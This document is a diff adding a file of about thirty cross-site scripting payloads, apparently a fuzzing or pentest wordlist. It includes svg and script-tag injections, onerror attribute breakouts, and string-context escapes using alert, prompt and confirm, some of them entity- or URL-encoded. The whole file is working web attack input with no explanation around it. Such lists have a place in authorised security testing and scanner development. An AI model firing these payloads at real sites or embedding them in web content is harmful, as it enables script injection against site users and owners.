@@ -1,0 +1,29 @@
+<svg/onload=alert()>
+"><svg/onload=alert()>
+?><script>alert(?X?)</script>
+</ScrIpt><script>alert(1)</script>
+"><script>alert(1)</script>
+" onerror=alert(1) "
+" onerror=alert(1) x="
+-alert(1)-
+-prompt(1)-
+<SCRIPT>+alert("X");</SCRIPT>
+<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+'><x onload'=alert(1)
+alert(/XSS/);
+1;alert(/XSS/);
+1';alert(/XSS/);x='1
+this['alert'](1)
+"-alert(1)-"
+"/alert(1)/"
+"|alert(1)|"
+==alert(1)==
+[alert(1)]+
+^alert(1)^
+|alert(1)|
+&alert(1)&
+'|\u0061lert()|'
+&#x00027;; confirm(1); &#x00027;
+&#39;; confirm(1); &#39;
+%27; confirm(1); %27
+'; confirm(1); '
